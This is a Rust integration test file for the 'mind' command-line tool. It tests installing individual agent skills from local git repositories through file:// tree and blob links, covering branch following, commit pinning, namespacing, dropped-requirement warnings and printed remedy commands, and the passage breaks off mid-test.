//! Integration tests for item links (spec/item-link.md, LNK-*): a deep
//! tree/blob URL to one skill inside a repo, consumed as its own single-item
//! source instance.
//!
//! Each test drives the real `mind` binary against a hermetic, network-free
//! fixture: a local git repo addressed through the `file://` link form
//! (LNK-1), with MIND_HOME/CLAUDE_HOME pointed at a temp dir.

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU32, Ordering};

static COUNTER: AtomicU32 = AtomicU32::new(0);

struct Sandbox {
    base: PathBuf,
    source: PathBuf,
    mind_home: PathBuf,
    claude_home: PathBuf,
}

struct Run {
    stdout: String,
    stderr: String,
    success: bool,
}

impl Sandbox {
    /// A source repo with two convention skills (`review`, `extra`).
    fn new() -> Sandbox {
        let sb = Sandbox::bare("agents");
        sb.write_and_commit(
            "skills/review/SKILL.md",
            "---\ndescription: Review the diff for bugs\n---\n# review skill\n",
        );
        sb.write_and_commit(
            "skills/extra/SKILL.md",
            "---\ndescription: A second skill\n---\n# extra skill\n",
        );
        sb
    }

    fn bare(name: &str) -> Sandbox {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!("mind-lnk-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let source = base.join(name);
        let sb = Sandbox {
            base: base.clone(),
            source: source.clone(),
            mind_home: base.join("mind"),
            claude_home: base.join("claude"),
        };
        write(&source.join("README.md"), "# fixture\n");
        git(&source, &["-c", "init.defaultBranch=main", "init", "-q"]);
        git(&source, &["config", "user.email", "t@t"]);
        git(&source, &["config", "user.name", "t"]);
        git(&source, &["add", "-A"]);
        git(&source, &["commit", "-qm", "initial"]);
        sb
    }

    fn mind(&self, args: &[&str]) -> Run {
        self.mind_env(args, &[])
    }

    fn mind_env(&self, args: &[&str], envs: &[(&str, &str)]) -> Run {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_mind"));
        cmd.args(args)
            .env("MIND_HOME", &self.mind_home)
            .env("CLAUDE_HOME", &self.claude_home)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::null());
        for (k, v) in envs {
            cmd.env(k, v);
        }
        let out = cmd.output().expect("run mind");
        Run {
            stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
            success: out.status.success(),
        }
    }

    fn write_and_commit(&self, rel: &str, contents: &str) {
        write(&self.source.join(rel), contents);
        git(&self.source, &["add", "-A"]);
        git(&self.source, &["commit", "-qm", "fixture"]);
    }

    /// A `file://` item link into this sandbox's source repo (LNK-1).
    fn link(&self, tail: &str) -> String {
        format!("file://{}/{tail}", self.source.to_string_lossy())
    }

    /// The registered identity of a link instance for `path` (LNK-4):
    /// `local/<base>/<repo>#<path>`.
    fn link_name(&self, path: &str) -> String {
        format!(
            "local/{}/{}#{path}",
            self.base.file_name().unwrap().to_string_lossy(),
            self.source.file_name().unwrap().to_string_lossy(),
        )
    }

    /// HEAD commit sha of the source repo.
    fn head_sha(&self) -> String {
        let out = Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(&self.source)
            .output()
            .expect("git rev-parse");
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.base);
    }
}

fn write(path: &Path, contents: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, contents).unwrap();
}

fn git(dir: &Path, args: &[&str]) {
    let status = Command::new("git")
        .args(args)
        .current_dir(dir)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .expect("run git");
    assert!(status.success(), "git {args:?} failed in {dir:?}");
}

/// Count the melded sources by reading sources.json (0 when absent).
fn source_count(sb: &Sandbox) -> usize {
    let path = sb.mind_home.join("sources.json");
    let Ok(json) = std::fs::read_to_string(&path) else {
        return 0;
    };
    json.matches("\"url\"").count()
}

#[test]
fn learn_url_installs_the_single_linked_skill() {
    // spec: LNK-6 LNK-7
    // `learn <url>` one-shots: registers the link instance and installs its
    // skill. Only the linked skill is offered/installed; the repo's other
    // skill is untouched.
    let sb = Sandbox::new();
    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(r.success, "learn <url> failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the linked skill must be installed"
    );
    assert!(
        !sb.claude_home.join("skills/extra").exists(),
        "the repo's other skill must NOT be installed"
    );
    assert_eq!(
        source_count(&sb),
        1,
        "exactly one source instance registered"
    );

    // The instance's catalog is exactly the linked skill (LNK-7).
    let probe = sb.mind(&["probe"]);
    assert!(
        probe.stdout.contains("skill:review") && !probe.stdout.contains("skill:extra"),
        "only the linked skill is offered: {}",
        probe.stdout
    );
}

#[test]
fn learn_url_again_is_an_up_to_date_noop() {
    // spec: LNK-6 LNK-4
    // Re-supplying an already-registered link re-enters the standard flow
    // (CLI-12/CLI-157): nothing re-clones, nothing errors.
    let sb = Sandbox::new();
    let url = sb.link("tree/main/skills/review");
    assert!(sb.mind(&["learn", &url]).success);
    let r = sb.mind(&["learn", &url]);
    assert!(r.success, "second learn <url> failed: {}", r.stderr);
    assert!(
        r.stdout.contains("already installed"),
        "second learn must be the up-to-date no-op: {}",
        r.stdout
    );
    assert_eq!(source_count(&sb), 1, "no duplicate instance registered");
}

#[test]
fn meld_url_registers_without_installing() {
    // spec: LNK-6
    // `meld <url> --register-only` follows the standard meld flow: the
    // instance registers and its skill is offered, not installed.
    let sb = Sandbox::new();
    let r = sb.mind(&[
        "meld",
        &sb.link("tree/main/skills/review"),
        "--register-only",
    ]);
    assert!(r.success, "meld <url> failed: {} {}", r.stdout, r.stderr);
    assert!(
        !sb.claude_home.join("skills/review").exists(),
        "--register-only must not install"
    );
    let probe = sb.mind(&["probe"]);
    assert!(
        probe.stdout.contains("skill:review"),
        "the linked skill must be offered: {}",
        probe.stdout
    );
}

#[test]
fn blob_link_to_skill_md_installs() {
    // spec: LNK-1
    // The blob form names the SKILL.md itself; the skill directory is its
    // parent.
    let sb = Sandbox::new();
    let r = sb.mind(&["learn", &sb.link("blob/main/skills/review/SKILL.md")]);
    assert!(r.success, "blob learn failed: {} {}", r.stdout, r.stderr);
    assert!(sb.claude_home.join("skills/review").exists());
}

#[test]
fn link_reaches_a_skill_the_marketplace_manifest_does_not_list() {
    // spec: LNK-7
    // The repo ships a marketplace.json that lists one plugin; the linked
    // skill is outside it. The link bypasses the manifest's authority.
    let sb = Sandbox::bare("mkt");
    sb.write_and_commit(
        ".claude-plugin/marketplace.json",
        r#"{"name":"Cat","plugins":[{"name":"kit","source":"./plugins/kit"}]}"#,
    );
    sb.write_and_commit(
        "plugins/kit/skills/foo/SKILL.md",
        "---\ndescription: listed\n---\n# foo\n",
    );
    sb.write_and_commit(
        "community/hidden/SKILL.md",
        "---\ndescription: unlisted\n---\n# hidden\n",
    );
    let r = sb.mind(&["learn", &sb.link("tree/main/community/hidden")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("skills/hidden").exists(),
        "the unlisted skill must install via its link"
    );
    // The manifest's plugin was not melded as a side effect (LNK-8).
    assert_eq!(source_count(&sb), 1, "only the link instance registers");
}

#[test]
fn link_instances_and_a_plain_meld_coexist() {
    // spec: LNK-4 LNK-12
    // Two links into the same repo, plus the repo itself (namespaced to avoid
    // an item collision), are three distinct registered sources.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/extra")])
            .success
    );
    let spec = sb.source.to_string_lossy().into_owned();
    let r = sb.mind(&["meld", &spec, "--namespace", "full", "--register-only"]);
    assert!(r.success, "plain meld failed: {} {}", r.stdout, r.stderr);
    assert_eq!(source_count(&sb), 3, "instances and the repo are distinct");

    // recall --sources shows each instance under its #-suffixed identity.
    let sources = sb.mind(&["recall", "--sources"]);
    assert!(
        sources.stdout.contains("#skills/review") && sources.stdout.contains("#skills/extra"),
        "link identities must be visible: {}",
        sources.stdout
    );
}

#[test]
fn item_link_composes_with_a_consumer_alias() {
    // spec: STO-58 LNK-4 -- `--namespace` composes with an item link: the
    // instance identity is `host/owner/repo#<path>@<alias>` and its skill installs
    // under the prefix, coexisting with an unaliased link into the same path.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success,
        "bare link install"
    );
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "unprefixed link skill installs"
    );

    let r = sb.mind(&[
        "meld",
        &sb.link("tree/main/skills/review"),
        "--namespace",
        "jk",
        "--yes",
    ]);
    assert!(r.success, "aliased link meld: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("skills/jk:review").exists(),
        "aliased link installs its skill under the prefix"
    );
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the bare link's skill survives"
    );
    let sources = sb.mind(&["recall", "--sources"]).stdout;
    assert!(
        sources.contains("#skills/review@jk"),
        "the aliased link identity must be visible: {sources}"
    );
    assert_eq!(
        source_count(&sb),
        2,
        "the bare and aliased link instances coexist"
    );
}

#[test]
fn link_without_skill_md_is_an_error_and_registers_nothing() {
    // spec: LNK-7
    let sb = Sandbox::new();
    let r = sb.mind(&["learn", &sb.link("tree/main/skills/nope")]);
    assert!(!r.success, "a linkless path must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("not a skill directory"),
        "the error must say the path is not a skill: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn branch_link_upgrades_with_the_branch() {
    // spec: LNK-5
    // A tree/<branch> link follows that branch: sync + upgrade pick up an
    // upstream edit to the linked skill.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review the diff for bugs\n---\n# review skill\nedited\n",
    );
    assert!(sb.mind(&["sync"]).success);
    let r = sb.mind(&["upgrade", "--yes"]);
    assert!(r.success, "upgrade failed: {} {}", r.stdout, r.stderr);
    let installed = std::fs::read_to_string(sb.claude_home.join("skills/review/SKILL.md")).unwrap();
    assert!(
        installed.contains("edited"),
        "the installed skill must carry the upstream edit: {installed}"
    );
}

#[test]
fn sha_link_pins_and_does_not_follow() {
    // spec: LNK-3
    // A tree/<40-hex> link is a commit pin: an upstream edit does not reach
    // the installed skill through sync + upgrade.
    let sb = Sandbox::new();
    let sha = sb.head_sha();
    let r = sb.mind(&["learn", &sb.link(&format!("tree/{sha}/skills/review"))]);
    assert!(r.success, "sha learn failed: {} {}", r.stdout, r.stderr);
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review the diff for bugs\n---\n# review skill\nedited\n",
    );
    assert!(sb.mind(&["sync"]).success);
    assert!(sb.mind(&["upgrade", "--yes"]).success);
    let installed = std::fs::read_to_string(sb.claude_home.join("skills/review/SKILL.md")).unwrap();
    assert!(
        !installed.contains("edited"),
        "a sha-pinned link must not follow the branch: {installed}"
    );
}

#[test]
fn learn_pin_freezes_a_branch_link() {
    // spec: CLI-200, LNK-3
    // `learn <branch-link> --pin` freezes the link's branch ref to its current
    // commit, so an upstream edit does not reach the installed skill through
    // sync + upgrade (the branch-following default would, cf.
    // branch_link_upgrades_with_the_branch).
    let sb = Sandbox::new();
    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review"), "--pin"]);
    assert!(
        r.success,
        "pinned link learn failed: {} {}",
        r.stdout, r.stderr
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review the diff for bugs\n---\n# review skill\nedited\n",
    );
    assert!(sb.mind(&["sync"]).success);
    assert!(sb.mind(&["upgrade", "--yes"]).success);
    let installed = std::fs::read_to_string(sb.claude_home.join("skills/review/SKILL.md")).unwrap();
    assert!(
        !installed.contains("edited"),
        "a --pin frozen branch link must not follow the branch: {installed}"
    );
}

#[test]
fn unmeld_link_instance_uninstalls_its_skill() {
    // spec: LNK-5
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    let name = sb.link_name("skills/review");
    let r = sb.mind(&["unmeld", &name, "--yes"]);
    assert!(r.success, "unmeld failed: {} {}", r.stdout, r.stderr);
    assert!(
        !sb.claude_home.join("skills/review").exists(),
        "unmeld must uninstall the instance's skill"
    );
    assert_eq!(source_count(&sb), 0);
}

#[test]
fn forget_of_an_emptied_link_hints_at_unmeld() {
    // spec: LNK-5
    // forget leaves the instance registered and points at unmeld.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    let r = sb.mind(&["forget", "review"]);
    assert!(r.success, "forget failed: {} {}", r.stdout, r.stderr);
    assert!(
        r.stderr.contains("mind unmeld"),
        "forget must hint at unmeld for an emptied link instance: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 1, "the instance stays registered");
}

// ----- LNK-18: intra-source references under a single-skill link -----

#[test]
fn link_install_warns_about_an_unsatisfiable_requires_and_still_installs() {
    // spec: LNK-18
    // A link instance's catalog is exactly the linked skill (LNK-7), so a
    // `requires:` entry naming a sibling can never resolve. `requires` is pure
    // metadata (DEP-4), so the install proceeds with a warning that names the
    // unresolved entry and the one-command remedy (CLI-236) -- rather than the
    // blunt DEP-6 `BadReference` that would make the skill unreachable by link.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(
        r.success,
        "an unsatisfiable requires must not fail a link install: {} {}",
        r.stdout, r.stderr
    );
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the linked skill must still install"
    );
    assert!(
        !sb.claude_home.join("agents/dev.md").exists(),
        "the link cannot install the sibling it names"
    );
    let combined = format!("{}{}", r.stdout, r.stderr);
    assert!(
        combined.contains("agent:dev") && combined.contains("single-item link"),
        "the warning must name the unresolved entry and why it cannot resolve: {combined}"
    );
    assert!(
        combined.contains("mind meld") && combined.contains("--learn 'skill:review'"),
        "the warning must name the one-command remedy: {combined}"
    );
}

/// Pull the remedy command out of a printed LNK-18 warning or error: the text
/// between the backticks. Tests run this VERBATIM, so a remedy that would not
/// work when pasted fails the test rather than passing on a substring match.
fn extract_remedy(text: &str) -> String {
    let start = text.find('`').expect("a backticked remedy");
    let rest = &text[start + 1..];
    let end = rest.find('`').expect("a closing backtick");
    rest[..end].to_string()
}

/// Run a remedy command string through the real binary, splitting the shell
/// `a && b` form into its two commands and dropping the leading `mind`.
fn run_remedy(sb: &Sandbox, remedy: &str) -> Vec<Run> {
    remedy
        .split("&&")
        .map(|cmd| {
            let argv = shell_split(cmd.trim());
            assert_eq!(argv.first().map(String::as_str), Some("mind"));
            let args: Vec<&str> = argv[1..].iter().map(String::as_str).collect();
            sb.mind(&args)
        })
        .collect()
}

#[test]
fn the_remedy_a_link_prints_works_verbatim_after_the_link_installed() {
    // spec: LNK-18 CLI-236
    // The remedy is printed AFTER the skill installed from the link instance,
    // so it must account for that: dropping the instance first, then melding
    // the whole repo and installing just that skill with its closure (DEP-30).
    // Pasted as printed, it must succeed -- a bare `meld --learn` here would
    // collide with the name the link already installed.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill\n",
    );

    let learn = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(learn.success, "learn <url> failed: {}", learn.stderr);
    let remedy = extract_remedy(&format!("{}{}", learn.stdout, learn.stderr));

    // This repo is a plain convention layout, so an ordinary meld discovers the
    // linked skill by itself: the remedy must NOT carry the `--add-root .`
    // escape it emits only for a repo whose inventory hides the skill.
    assert!(
        !remedy.contains("--add-root"),
        "a discoverable skill must get the plain remedy form: {remedy}"
    );

    for (i, r) in run_remedy(&sb, &remedy).into_iter().enumerate() {
        assert!(
            r.success,
            "step {i} of the printed remedy `{remedy}` failed: {} {}",
            r.stdout, r.stderr
        );
    }
    assert!(
        sb.claude_home.join("skills/review").exists()
            && sb.claude_home.join("agents/dev.md").exists(),
        "the remedy must end with the skill and the sibling it requires installed"
    );
    assert!(
        !sb.claude_home.join("skills/extra").exists(),
        "the remedy must not install the repo's unrelated skills"
    );
    // The link instance is gone, replaced by the whole-repo source: one source.
    assert_eq!(source_count(&sb), 1, "the link instance must be replaced");
    // And the requirement is no longer recorded as dropped (LNK-19).
    let recall = sb.mind(&["recall", "skill:review"]);
    assert!(
        !recall.stdout.contains("dropped"),
        "the drop record must not survive the remedy: {}",
        recall.stdout
    );
}

#[test]
fn the_remedy_a_link_prints_works_verbatim_after_a_token_error() {
    // spec: LNK-18 -- the error path installs nothing but leaves the instance
    // registered, so its remedy must unmeld too. Run verbatim, it must work.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );

    let learn = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(!learn.success, "the token must fail the install");
    assert_eq!(
        source_count(&sb),
        1,
        "the aborted install leaves the instance registered"
    );

    let remedy = extract_remedy(&learn.stderr);
    for (i, r) in run_remedy(&sb, &remedy).into_iter().enumerate() {
        assert!(
            r.success,
            "step {i} of the printed remedy `{remedy}` failed: {} {}",
            r.stdout, r.stderr
        );
    }
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the remedy must install the skill the link could not"
    );
    assert_eq!(source_count(&sb), 1, "the link instance must be replaced");
}

#[test]
fn the_remedy_works_verbatim_for_a_repo_whose_inventory_hides_the_skill() {
    // spec: LNK-18 DSC-84
    // The case item links exist for: an authoritative `mind.toml` (DSC-3) that
    // does not declare the linked skill, so a PLAIN meld of the repo would not
    // discover it at all. The remedy's meld half must therefore carry
    // `--add-root .` (DSC-84). Without it the unmeld half succeeds and the meld
    // half then fails with `LearnPatternNoMatch`, leaving the user with the
    // skill uninstalled, the link gone, and a stray whole-repo source: strictly
    // worse than before pasting, with no recovery path in the message.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill\n",
    );
    // Authoritative: only `dev` is declared, so convention discovery is off and
    // `skills/review` is invisible to an ordinary meld.
    sb.write_and_commit(
        "mind.toml",
        "[[items]]\nkind = \"agent\"\nname = \"dev\"\npath = \"agents/dev.md\"\n",
    );

    let learn = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(learn.success, "the link install failed: {}", learn.stderr);
    let remedy = extract_remedy(&format!("{}{}", learn.stdout, learn.stderr));
    // The root is shell-quoted like every other value in the command, and is
    // `.` here because the skill sits at `<repo-root>/skills/review`.
    assert!(
        remedy.contains("--add-root '.'"),
        "a skill a plain meld cannot reach needs the --add-root form: {remedy}"
    );

    for (i, r) in run_remedy(&sb, &remedy).into_iter().enumerate() {
        assert!(
            r.success,
            "step {i} of the printed remedy `{remedy}` failed: {} {}",
            r.stdout, r.stderr
        );
    }
    assert!(
        sb.claude_home.join("skills/review").exists()
            && sb.claude_home.join("agents/dev.md").exists(),
        "the remedy must end with the skill and the sibling it requires installed"
    );
    assert_eq!(source_count(&sb), 1, "the link instance must be replaced");
    let recall = sb.mind(&["recall", "skill:review"]);
    assert!(
        !recall.stdout.contains("dropped"),
        "the drop record must not survive the remedy: {}",
        recall.stdout
    );
}

#[test]
fn the_remedy_names_the_scan_root_a_nested_skill_actually_needs() {
    // spec: LNK-18 DSC-84
    // An added root is convention-scanned only ONE level deep (flat children,
    // plus a `skills/` container directly under it), so a fixed `--add-root .`
    // reaches `<repo-root>/skills/<name>` and nothing deeper. For a skill at
    // `vendor/pkg/skills/review` the root has to be `vendor/pkg`, or the meld
    // half fails with `LearnPatternNoMatch` after the unmeld half already ran.
    let sb = Sandbox::new();
    // A sibling-naming token makes this a hard stop, which is the path that
    // prints a remedy with nothing installed.
    sb.write_and_commit(
        "vendor/pkg/skills/review/SKILL.md",
        "---\ndescription: nested\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );
    // Authoritative, and it does not declare the nested skill, so a plain meld
    // cannot reach it and the remedy must take the --add-root branch.
    sb.write_and_commit(
        "mind.toml",
        "[[items]]\nkind = \"skill\"\nname = \"extra\"\npath = \"skills/extra\"\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/vendor/pkg/skills/review")]);
    assert!(!r.success, "the token must fail the install: {}", r.stdout);
    let remedy = extract_remedy(&r.stderr);
    assert!(
        remedy.contains("--add-root 'vendor/pkg'"),
        "the remedy must name the directory the scan starts from: {remedy}"
    );
}

#[test]
fn the_remedy_installs_the_literal_item_when_its_name_carries_glob_syntax() {
    // spec: LNK-18 CLI-236
    // `is_safe_item_name` permits `*`, `?` and `[`, and `--learn` reads those as
    // glob syntax, so the printed remedy glob-escapes the name. Escaping only
    // the printed text is not enough: the match it produces used to be handed
    // back to `learn` as a `<source>#<key>` STRING, which re-tested the name
    // with `is_glob` and re-expanded it. This repo ships both `pdf[x]` and
    // `pdfx`, so that second reading installs the wrong skill, observably.
    let sb = Sandbox::bare("agents");
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/pdf[x]/SKILL.md",
        "---\ndescription: The literal one\nrequires: agent:dev\n---\n# pdf[x]\n",
    );
    sb.write_and_commit(
        "skills/pdfx/SKILL.md",
        "---\ndescription: The one a glob would select\n---\n# pdfx\n",
    );

    let learn = sb.mind(&["learn", &sb.link("tree/main/skills/pdf[x]")]);
    assert!(learn.success, "the link install failed: {}", learn.stderr);
    let remedy = extract_remedy(&format!("{}{}", learn.stdout, learn.stderr));
    assert!(
        remedy.contains("--learn 'skill:pdf[[]x[]]'"),
        "the remedy must carry the kind-qualified, glob-escaped name: {remedy}"
    );

    // Drop the link instance, then run the remedy's meld half VERBATIM. The
    // unmeld half is not run here: `unmeld`'s selector is glob-aware (CLI-28),
    // so an identity ending in `pdf[x]` reads as a character class and matches
    // nothing. That is a separate defect in the selector, not in the pattern
    // this test is about, so the instance is dropped with an escaped selector.
    let escaped_identity = sb
        .link_name("skills/pdf[x]")
        .replace("pdf[x]", "pdf[[]x[]]");
    assert!(
        sb.mind(&["unmeld", &escaped_identity, "--yes"]).success,
        "the link instance must be droppable"
    );
    let meld_half = remedy.split("&&").nth(1).expect("a two-step remedy").trim();
    let argv = shell_split(meld_half);
    assert_eq!(argv.first().map(String::as_str), Some("mind"));
    let args: Vec<&str> = argv[1..].iter().map(String::as_str).collect();
    let r = sb.mind(&args);
    assert!(
        r.success,
        "the meld half `{meld_half}` failed: {} {}",
        r.stdout, r.stderr
    );
    assert!(
        sb.claude_home.join("skills/pdf[x]").exists(),
        "the remedy must install the literally named skill: `{remedy}`"
    );
    assert!(
        !sb.claude_home.join("skills/pdfx").exists(),
        "the remedy must not install the skill a glob reading selects: `{remedy}`"
    );
    assert!(
        sb.claude_home.join("agents/dev.md").exists(),
        "the remedy must still bring the closure of the item it names"
    );
}

#[test]
fn learn_pattern_installs_an_item_whose_name_contains_a_hash() {
    // spec: CLI-236
    // `is_safe_item_name` permits `#`, so a `--learn` match cannot be carried as
    // a `<source>#<key>` string: split on the last `#`, this item's key reads as
    // `skill:review`, an item that also exists here and is already installed.
    // The selection was therefore filtered out as "already installed" and mind
    // reported "nothing to do" about an item it never installed.
    let sb = Sandbox::bare("agents");
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: The decoy\n---\n# review\n",
    );
    sb.write_and_commit(
        "skills/x#skill:review/SKILL.md",
        "---\ndescription: The hash-named one\n---\n# hash\n",
    );
    let repo = sb.source.to_string_lossy().into_owned();
    assert!(sb.mind(&["meld", &repo, "--register-only"]).success);
    assert!(
        sb.mind(&["learn", "skill:review"]).success,
        "the decoy must be installed first: that is what the bad split collides with"
    );

    let r = sb.mind(&["meld", &repo, "--learn", "x*", "--yes"]);
    assert!(r.success, "meld --learn failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("skills/x#skill:review").exists(),
        "the hash-named item must install: {} {}",
        r.stdout,
        r.stderr
    );
    assert!(
        !r.stdout.contains("already installed"),
        "the hash-named item is not installed, so mind must not say it is: {}",
        r.stdout
    );
}

#[test]
fn a_dropped_requires_is_recorded_and_surfaced_after_the_warning_scrolls_away() {
    // spec: LNK-19
    // The install-time warning is transient; the record on the installed item is
    // what `recall`, `recall --json`, and `introspect` surface later.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill\n",
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );

    let recall = sb.mind(&["recall", "skill:review"]);
    assert!(
        recall.stdout.contains("dropped") && recall.stdout.contains("agent:dev"),
        "recall must show the dropped requirement: {}",
        recall.stdout
    );

    let json = sb.mind(&["--json", "recall", "skill:review"]);
    let doc: serde_json::Value = serde_json::from_str(&json.stdout)
        .unwrap_or_else(|e| panic!("recall --json must be one document ({e}): {}", json.stdout));
    assert_eq!(
        doc["dropped_requires"]
            .as_array()
            .map(|a| a.iter().map(|v| v.as_str().unwrap()).collect::<Vec<_>>()),
        Some(vec!["agent:dev"]),
        "the JSON item shape must carry the drop: {}",
        json.stdout
    );

    let introspect = sb.mind(&["introspect"]);
    assert!(
        introspect.stdout.contains("skill:review") && introspect.stdout.contains("agent:dev"),
        "introspect must report the degraded item: {}",
        introspect.stdout
    );
    // Unconditional: gating this on `introspect.success` would make it vacuous
    // the moment introspect starts exiting non-zero on any issue, which is the
    // very outcome this drop is meant to produce.
    assert!(
        !introspect.stdout.contains("all good"),
        "introspect must not call a degraded item all good: {}",
        introspect.stdout
    );
    // The third surface LNK-19 names: the machine-readable one.
    let ij = sb.mind(&["introspect", "--json"]);
    let report: serde_json::Value = serde_json::from_str(&ij.stdout).unwrap_or_else(|e| {
        panic!(
            "introspect --json must be one document ({e}): {}",
            ij.stdout
        )
    });
    let issue = report["issues"]
        .as_array()
        .expect("issues array")
        .iter()
        .find(|i| i["kind"] == "dropped-requires")
        .unwrap_or_else(|| panic!("no dropped-requires issue: {}", ij.stdout));
    assert_eq!(issue["target"], "skill:review", "{}", ij.stdout);
    let message = issue["message"].as_str().unwrap_or_default();
    assert!(
        message.contains("agent:dev"),
        "the issue must name the dropped entry: {message}"
    );
    // The hint must be a command that exists: `recall`'s positional resolves an
    // ITEM against the manifest, so `mind recall <source>` errors with "is not
    // installed". Prove the suggested command actually runs.
    assert!(
        message.contains("mind recall --sources"),
        "the issue must point at a real command: {message}"
    );
    let sources = sb.mind(&["recall", "--sources"]);
    assert!(
        sources.success && sources.stdout.contains("#skills/review"),
        "the suggested command must list the link source: {} {}",
        sources.stdout,
        sources.stderr
    );
}

#[test]
fn an_ordinary_install_records_no_dropped_requires() {
    // spec: LNK-19 -- the field is empty (and omitted from the manifest) for
    // every install that is not a link with an unsatisfiable requirement, so an
    // ordinary source reads back exactly as before.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill\n",
    );
    let repo = sb.source.to_string_lossy().into_owned();
    assert!(sb.mind(&["meld", &repo, "--yes"]).success);

    let manifest = std::fs::read_to_string(sb.mind_home.join("manifest.json")).unwrap();
    assert!(
        !manifest.contains("dropped_requires"),
        "an ordinary install must not write the field: {manifest}"
    );
    let recall = sb.mind(&["recall", "skill:review"]);
    assert!(!recall.stdout.contains("dropped"), "{}", recall.stdout);
    assert!(
        sb.mind(&["introspect"]).stdout.contains("all good"),
        "introspect must be clean for an ordinary install"
    );
}

#[test]
fn upgrading_a_link_whose_upstream_added_a_requires_warns_instead_of_failing() {
    // spec: LNK-18 LNK-19
    // The reconciliation runs on the upgrade path too: an upstream edit that
    // adds a `requires` entry must not turn every later `upgrade` of the link
    // into a hard failure, and the drop record must reflect the new version.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\n---\n# review skill\n",
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    let before = sb.mind(&["recall", "skill:review"]);
    assert!(!before.stdout.contains("dropped"), "{}", before.stdout);

    // Upstream adds a requirement the single-skill catalog cannot satisfy.
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: agent:dev\n---\n# review skill v2\n",
    );
    let up = sb.mind(&["upgrade", "--yes"]);
    assert!(
        up.success,
        "upgrade must not hard-fail on the new requires: {} {}",
        up.stdout, up.stderr
    );
    let combined = format!("{}{}", up.stdout, up.stderr);
    assert!(
        combined.contains("agent:dev"),
